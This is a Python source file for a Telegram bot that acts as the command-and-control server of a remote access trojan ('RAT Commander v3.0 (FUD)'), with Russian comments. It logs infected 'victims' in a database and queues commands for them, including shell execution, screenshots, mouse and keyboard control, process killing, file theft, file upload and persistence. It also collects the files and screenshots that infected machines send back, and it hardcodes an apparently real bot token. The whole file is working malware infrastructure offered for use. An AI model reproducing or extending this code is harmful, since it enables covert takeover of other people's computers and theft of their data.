import telebot
import sqlite3
import json
import time
import os
import threading
from datetime import datetime

# ===== ТВОИ ДАННЫЕ (вставлены напрямую) =====
BOT_TOKEN = "8721820771:AAEV9VH1o0Lv57_d1K_ZfPIHqCHaMtRlpDU"
ADMIN_ID = 8675666699
# ===========================================

bot = telebot.TeleBot(BOT_TOKEN)

# База данных жертв
conn = sqlite3.connect("victims.db", check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS victims
             (id TEXT PRIMARY KEY, name TEXT, os TEXT, ip TEXT, first_seen TEXT, last_seen TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS files
             (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, filename TEXT, size INTEGER, ts TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS pending_commands
             (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, command TEXT, data TEXT, ts TEXT, status TEXT DEFAULT 'pending')''')
conn.commit()

def log_victim(victim_id, name, os_info, ip):
    c.execute("SELECT * FROM victims WHERE id=?", (victim_id,))
    if not c.fetchone():
        c.execute("INSERT INTO victims VALUES (?,?,?,?,?,?)",
                  (victim_id, name, os_info, ip, str(time.time()), str(time.time())))
    else:
        c.execute("UPDATE victims SET last_seen=? WHERE id=?", (str(time.time()), victim_id))
    conn.commit()

def log_file(victim_id, filename, size):
    c.execute("INSERT INTO files (victim_id, filename, size, ts) VALUES (?,?,?,?)",
              (victim_id, filename, size, str(time.time())))
    conn.commit()

@bot.message_handler(commands=['start'])
def start_cmd(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Неавторизован.")
        return
    bot.reply_to(message, "🔥 RAT Commander v3.0 (FUD)\n"
                         "/list — список жертв\n"
                         "/exec <id> <cmd> — выполнить команду\n"
                         "/screenshot <id> — скриншот\n"
                         "/mouse <id> <x> <y> — переместить мышь\n"
                         "/click <id> left/right — клик\n"
                         "/key <id> <keys> — нажать клавиши\n"
                         "/run <id> <app> — запустить приложение\n"
                         "/kill <id> <proc> — убить процесс\n"
                         "/download <id> <filepath> — скачать файл\n"
                         "/persist <id> — установить автозагрузку\n"
                         "/remove <id> — удалить жертву")

@bot.message_handler(commands=['list'])
def list_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    c.execute("SELECT id, name, ip, last_seen FROM victims")
    victims = c.fetchall()
    if not victims:
        bot.reply_to(message, "Нет жертв.")
        return
    resp = "📋 ЖЕРТВЫ:\n"
    for v in victims:
        resp += f"🆔 {v[0]} | {v[1]} | {v[2]} | последний раз: {time.ctime(float(v[3]))}\n"
    bot.reply_to(message, resp)

@bot.message_handler(commands=['exec', 'screenshot', 'mouse', 'click', 'key', 'run', 'kill', 'persist', 'remove'])
def generic_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 2:
        bot.reply_to(message, f"Использование: /{parts[0]} victim_id [args]")
        return
    victim_id = parts[1]
    command = f"{parts[0][1:]} " + (parts[2] if len(parts)>2 else "")
    c.execute("INSERT INTO pending_commands (victim_id, command, ts, status) VALUES (?,?,?,?)",
              (victim_id, command, str(time.time()), 'pending'))
    conn.commit()
    bot.reply_to(message, f"✅ {parts[0]} отправлена {victim_id}")

@bot.message_handler(commands=['download'])
def download_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "Использование: /download victim_id filepath")
        return
    victim_id, filepath = parts[1], parts[2]
    c.execute("INSERT INTO pending_commands (victim_id, command, data, ts, status) VALUES (?,?,?,?,?)",
              (victim_id, "download", filepath, str(time.time()), 'pending'))
    conn.commit()
    bot.reply_to(message, f"✅ Запрос на скачивание {filepath} отправлен {victim_id}")

@bot.message_handler(content_types=['document'])
def handle_upload(message):
    if message.from_user.id != ADMIN_ID: return
    # Ожидаем, что перед этим была команда /upload victim_id (упрощённо)
    if not hasattr(bot, 'upload_target'):
        return
    victim_id = bot.upload_target
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    tmp = f"temp_{message.document.file_name}"
    with open(tmp, 'wb') as f:
        f.write(downloaded)
    c.execute("INSERT INTO pending_commands (victim_id, command, data, ts, status) VALUES (?,?,?,?,?)",
              (victim_id, "upload", f"{message.document.file_name}|{tmp}", str(time.time()), 'pending'))
    conn.commit()
    bot.reply_to(message, f"✅ Файл {message.document.file_name} отправлен {victim_id}")

@bot.message_handler(func=lambda m: m.text and m.text.startswith('/result_'))
def result_handler(message):
    victim_id = message.from_user.id
    result = message.text.replace('/result_', '', 1)
    bot.send_message(ADMIN_ID, f"📡 РЕЗУЛЬТАТ ОТ {victim_id}:\n{result}")

@bot.message_handler(content_types=['photo', 'document'])
def file_from_client(message):
    if message.from_user.id == ADMIN_ID: return
    victim_id = message.from_user.id
    if message.photo:
        file_id = message.photo[-1].file_id
        ext = "jpg"
        filename = f"screenshot_{int(time.time())}.{ext}"
    else:
        file_id = message.document.file_id
        filename = message.document.file_name
    file_info = bot.get_file(file_id)
    downloaded = bot.download_file(file_info.file_path)
    os.makedirs(f"files_{victim_id}", exist_ok=True)
    save_path = f"files_{victim_id}/{filename}"
    with open(save_path, 'wb') as f:
        f.write(downloaded)
    log_file(str(victim_id), filename, len(downloaded))
    bot.send_message(ADMIN_ID, f"📥 Файл от {victim_id}: {filename}")

if __name__ == "__main__":
    bot.infinity_polling()
